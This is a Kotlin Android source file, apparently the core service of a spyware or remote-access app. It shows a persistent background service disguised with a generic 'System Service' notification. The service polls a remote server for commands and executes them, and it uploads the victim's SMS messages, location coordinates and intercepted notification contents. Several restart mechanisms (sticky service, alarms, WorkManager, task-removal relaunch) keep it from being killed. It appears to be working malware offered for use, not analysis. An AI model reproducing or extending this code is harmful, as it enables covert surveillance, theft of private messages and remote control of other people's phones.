package com.csk4.app

import android.app.*
import android.content.Context
import android.content.Intent
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.provider.Settings
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.work.*
import com.android.volley.Request
import com.android.volley.toolbox.JsonObjectRequest
import com.android.volley.toolbox.Volley
import org.json.JSONObject
import java.util.concurrent.TimeUnit

class CommandService : Service() {

    companion object {
        private const val TAG = "CSK4_SVC"
        private const val RETRY_DELAY_BASE = 5000L  // 5 seconds
        private const val MAX_RETRY_DELAY = 300000L // 5 minutes
    }

    private val handler = Handler(Looper.getMainLooper())
    private lateinit var deviceId: String
    private lateinit var engine: CommandHandler
    private lateinit var localStorage: LocalStorage
    private var isOnline = false
    private var retryCount = 0
    private var isRunning = false
    private lateinit var connectivityManager: ConnectivityManager
    private lateinit var networkCallback: ConnectivityManager.NetworkCallback

    // ============ POLLING ============
    private val poller = object : Runnable {
        override fun run() {
            if (!isRunning) return
            pollCommands()
            handler.postDelayed(this, Config.COMMAND_POLL_INTERVAL)
        }
    }

    // ============ HEARTBEAT ============
    private val hb = object : Runnable {
        override fun run() {
            if (!isRunning) return
            heartbeat()
            handler.postDelayed(this, Config.HEARTBEAT_INTERVAL)
        }
    }

    // ============ SYNC ============
    private val syncer = object : Runnable {
        override fun run() {
            if (!isRunning) return
            if (isOnline) syncOfflineQueue()
            handler.postDelayed(this, Config.SYNC_INTERVAL)
        }
    }

    // ============ KEEP ALIVE ============
    private val keepAlive = object : Runnable {
        override fun run() {
            if (!isRunning) return
            // Force wake up service
            Log.d(TAG, "🔄 Keep alive check")
            // Update notification to prevent kill
            updateNotification()
            // Re-schedule all
            handler.removeCallbacks(poller)
            handler.removeCallbacks(hb)
            handler.post(poller)
            handler.post(hb)
            handler.postDelayed(this, 60000L) // 1 min
        }
    }

    // ============ LIFECYCLE ============
    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "🚀 Service onCreate")
        
        deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
        localStorage = LocalStorage(this)
        engine = CommandHandler(this, deviceId)
        
        startForeground(Config.NOTIFICATION_ID, notif())
        startNetworkMonitor()
        scheduleWorkManager()
        scheduleAutoRestart()
        
        isRunning = true
        handler.post(poller)
        handler.post(hb)
        handler.postDelayed(syncer, 10000)
        handler.postDelayed(keepAlive, 60000)
        
        Log.d(TAG, "✅ Service started for: $deviceId")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "🔄 onStartCommand")
        // Auto-restart if killed
        return START_STICKY
    }

    override fun onDestroy() {
        Log.d(TAG, "❌ Service onDestroy")
        isRunning = false
        handler.removeCallbacks(poller)
        handler.removeCallbacks(hb)
        handler.removeCallbacks(syncer)
        handler.removeCallbacks(keepAlive)
        
        try {
            connectivityManager.unregisterNetworkCallback(networkCallback)
        } catch (e: Exception) {}
        
        // Schedule restart
        scheduleAutoRestart()
        
        super.onDestroy()
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        Log.d(TAG, "⚠️ Task removed — scheduling restart")
        // Restart service
        val restartService = Intent(applicationContext, CommandService::class.java)
        restartService.setPackage(packageName)
        
        val restartPendingIntent = if (Build.VERSION.SDK_INT >= 26) {
            PendingIntent.getForegroundService(
                this, 1, restartService,
                PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
            )
        } else {
            PendingIntent.getService(
                this, 1, restartService,
                PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
            )
        }
        
        val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
        alarmManager.set(
            AlarmManager.ELAPSED_REALTIME,
            System.currentTimeMillis() + 1000,
            restartPendingIntent
        )
        
        super.onTaskRemoved(rootIntent)
    }

    override fun onBind(intent: Intent?): IBinder? = null

    // ============ NETWORK MONITOR ============
    private fun startNetworkMonitor() {
        connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        
        val request = NetworkRequest.Builder()
            .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
            .build()

        networkCallback = object : ConnectivityManager.NetworkCallback() {
            override fun onAvailable(network: Network) {
                Log.d(TAG, "🌐 Network available")
                isOnline = true
                retryCount = 0
                handler.postDelayed({ syncOfflineQueue() }, 2000)
            }

            override fun onLost(network: Network) {
                Log.d(TAG, "📴 Network lost — offline mode")
                isOnline = false
            }

            override fun onCapabilitiesChanged(network: Network, caps: NetworkCapabilities) {
                isOnline = caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
            }
        }

        try {
            connectivityManager.registerNetworkCallback(request, networkCallback)
            isOnline = isCurrentlyOnline()
            Log.d(TAG, "📊 Initial network: ${if (isOnline) "Online" else "Offline"}")
        } catch (e: Exception) {
            Log.e(TAG, "Network monitor error: ${e.message}")
        }
    }

    private fun isCurrentlyOnline(): Boolean {
        return try {
            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val network = cm.activeNetwork ?: return false
            val caps = cm.getNetworkCapabilities(network) ?: return false
            caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
        } catch (e: Exception) { false }
    }

    // ============ POLL COMMANDS ============
    private fun pollCommands() {
        if (!isOnline) {
            Log.d(TAG, "⚠️ Offline — skip polling")
            return
        }
        
        try {
            Volley.newRequestQueue(this).add(JsonObjectRequest(
                Request.Method.GET,
                "${Config.SERVER_URL}/api/device/commands/$deviceId",
                null,
                { resp ->
                    retryCount = 0
                    val arr = resp.optJSONArray("commands") ?: return@JsonObjectRequest
                    for (i in 0 until arr.length()) {
                        val c = arr.getJSONObject(i)
                        try {
                            engine.execute(
                                c.getString("command"),
                                c.optJSONObject("params") ?: JSONObject()
                            ) { result ->
                                markDone(c.getString("id"), result)
                            }
                        } catch (e: Exception) {
                            Log.e(TAG, "Command exec error: ${e.message}")
                        }
                    }
                },
                { error ->
                    Log.e(TAG, "Poll fail: ${error.message}")
                    retryCount++
                }
            ))
        } catch (e: Exception) {
            Log.e(TAG, "Poll exception: ${e.message}")
        }
    }

    private fun markDone(id: String, r: String) {
        if (!isOnline) {
            localStorage.addCommandResult(id, r)
            return
        }
        
        try {
            Volley.newRequestQueue(this).add(JsonObjectRequest(
                Request.Method.POST,
                "${Config.SERVER_URL}/api/device/command-done",
                JSONObject().apply { put("commandId", id); put("result", r) },
                null, null
            ))
        } catch (e: Exception) {
            localStorage.addCommandResult(id, r)
        }
    }

    // ============ HEARTBEAT ============
    private fun heartbeat() {
        val bm = getSystemService(BATTERY_SERVICE) as android.os.BatteryManager
        val b = bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
        
        if (!isOnline) {
            localStorage.addHeartbeat(b)
            return
        }

        try {
            Volley.newRequestQueue(this).add(JsonObjectRequest(
                Request.Method.POST,
                "${Config.SERVER_URL}/api/device/heartbeat",
                JSONObject().apply {
                    put("deviceId", deviceId)
                    put("battery", b)
                    put("token", Config.DEVICE_TOKEN)
                },
                null, null
            ))
        } catch (e: Exception) {
            localStorage.addHeartbeat(b)
        }
    }

    // ============ OFFLINE QUEUE SYNC ============
    private fun syncOfflineQueue() {
        if (!isOnline) return
        
        Log.d(TAG, "🔄 Syncing offline queue...")
        
        try {
            // 1. Sync command results
            val commands = localStorage.getPendingCommandResults()
            commands.forEach { (id, result) ->
                Volley.newRequestQueue(this).add(JsonObjectRequest(
                    Request.Method.POST,
                    "${Config.SERVER_URL}/api/device/command-done",
                    JSONObject().apply { put("commandId", id); put("result", result) },
                    { localStorage.markCommandSynced(id) },
                    { }
                ))
            }

            // 2. Sync heartbeats
            val heartbeats = localStorage.getPendingHeartbeats()
            heartbeats.forEach { hb ->
                Volley.newRequestQueue(this).add(JsonObjectRequest(
                    Request.Method.POST,
                    "${Config.SERVER_URL}/api/device/heartbeat",
                    JSONObject().apply {
                        put("deviceId", deviceId)
                        put("battery", hb)
                        put("token", Config.DEVICE_TOKEN)
                    },
                    { localStorage.markHeartbeatSynced(hb) },
                    { }
                ))
            }

            // 3. Sync locations
            val locations = localStorage.getPendingLocations()
            locations.forEach { loc ->
                Volley.newRequestQueue(this).add(JsonObjectRequest(
                    Request.Method.POST,
                    "${Config.SERVER_URL}/api/device/location",
                    JSONObject().apply {
                        put("deviceId", deviceId)
                        put("lat", loc.first)
                        put("lng", loc.second)
                        put("token", Config.DEVICE_TOKEN)
                    },
                    { localStorage.markLocationSynced(loc.first, loc.second) },
                    { }
                ))
            }

            // 4. Sync SMS
            val smsList = localStorage.getPendingSMS()
            if (smsList.isNotEmpty()) {
                val arr = org.json.JSONArray()
                smsList.forEach { arr.put(it) }
                Volley.newRequestQueue(this).add(JsonObjectRequest(
                    Request.Method.POST,
                    "${Config.SERVER_URL}/api/device/messages",
                    JSONObject().apply {
                        put("deviceId", deviceId)
                        put("messages", arr)
                        put("token", Config.DEVICE_TOKEN)
                    },
                    { localStorage.clearSyncedSMS() },
                    { }
                ))
            }

            // 5. Sync notifications
            val notifList = localStorage.getPendingNotifications()
            notifList.forEach { n ->
                Volley.newRequestQueue(this).add(JsonObjectRequest(
                    Request.Method.POST,
                    "${Config.SERVER_URL}/api/device/notification",
                    JSONObject().apply {
                        put("deviceId", deviceId)
                        put("package", n.optString("package"))
                        put("title", n.optString("title"))
                        put("text", n.optString("text"))
                        put("token", Config.DEVICE_TOKEN)
                    },
                    { localStorage.markNotificationSynced(n.optString("id")) },
                    { }
                ))
            }

            Log.d(TAG, "✅ Sync completed")
        } catch (e: Exception) {
            Log.e(TAG, "Sync error: ${e.message}")
        }
    }

    // ============ WORKMANAGER ============
    private fun scheduleWorkManager() {
        try {
            val constraints = Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .build()

            val workRequest = PeriodicWorkRequestBuilder<WorkManagerService>(
                15, TimeUnit.MINUTES
            )
                .setConstraints(constraints)
                .addTag(Config.WORK_MANAGER_TAG)
                .build()

            WorkManager.getInstance(this)
                .enqueueUniquePeriodicWork(
                    Config.WORK_MANAGER_TAG,
                    ExistingPeriodicWorkPolicy.KEEP,
                    workRequest
                )

            Log.d(TAG, "✅ WorkManager scheduled")
        } catch (e: Exception) {
            Log.e(TAG, "WorkManager error: ${e.message}")
        }
    }

    // ============ AUTO RESTART ============
    private fun scheduleAutoRestart() {
        try {
            val intent = Intent(this, AutoRestartReceiver::class.java)
            val pendingIntent = PendingIntent.getBroadcast(
                this,
                Config.RESTART_ALARM_CODE,
                intent,
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
            )

            val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
            alarmManager.setRepeating(
                AlarmManager.ELAPSED_REALTIME_WAKEUP,
                System.currentTimeMillis() + Config.AUTO_RESTART_INTERVAL,
                Config.AUTO_RESTART_INTERVAL,
                pendingIntent
            )

            Log.d(TAG, "✅ Auto-restart scheduled")
        } catch (e: Exception) {
            Log.e(TAG, "Auto-restart error: ${e.message}")
        }
    }

    // ============ NOTIFICATION ============
    private fun notif(): Notification {
        if (Build.VERSION.SDK_INT >= 26) {
            val c = NotificationChannel(
                Config.NOTIFICATION_CHANNEL_ID,
                Config.NOTIFICATION_CHANNEL_NAME,
                NotificationManager.IMPORTANCE_LOW
            )
            c.setShowBadge(false)
            c.setSound(null, null)
            c.enableVibration(false)
            (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager)
                .createNotificationChannel(c)
        }

        val intent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(
            this, 0, intent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        return NotificationCompat.Builder(this, Config.NOTIFICATION_CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("Running in background")
            .setSmallIcon(android.R.drawable.stat_sys_download_done)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .build()
    }

    private fun updateNotification() {
        try {
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            nm.notify(Config.NOTIFICATION_ID, notif())
        } catch (e: Exception) {}
    }
}
